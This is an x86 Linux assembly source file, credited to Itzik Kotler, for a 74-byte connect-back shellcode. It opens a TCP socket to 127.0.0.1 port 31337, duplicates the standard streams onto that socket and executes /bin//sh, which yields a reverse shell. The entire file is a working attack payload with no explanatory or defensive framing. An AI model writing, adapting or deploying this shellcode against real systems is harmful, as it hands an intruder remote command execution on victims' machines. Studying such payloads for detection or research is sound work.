#
# (linux/x86) connect-back shellcode, 127.0.0.1:31337/tcp - 74 bytes
# - Itzik Kotler <ik@ikotler.org>
#

.section .text
	.global _start
	_start:
		
	        push $0x66
	        popl %eax
	        cdq
	        pushl $0x1
	        popl %ebx
	        pushl %edx
	        pushl %ebx
	        pushl $0x2
		movl %esp, %ecx
		int $0x80

		popl %ebx
		popl %ebp
		movl $0xfeffff80, %esi
		notl %esi
		pushl %esi

	        movw $0x7a69, %bp
	        bswap %ebp
	        orl %ebx, %ebp
	        pushl %ebp

		incl %ebx
	        pushl $0x10
	        pushl %ecx
	        pushl %eax
		movb $0x66, %al

	_doint:

	        movl %esp, %ecx
		int $0x80

		xchg %ebx, %ecx
		popl %ebx

	_dup2loop:

		movb $0x3f, %al
		int $0x80
		decl %ecx
		jns _dup2loop

		movb $0xb, %al
                push %edx
                push $0x68732f2f
                push $0x6e69622f
                mov %esp,%ebx
                push %edx
                push %ebx
		jmp _doint

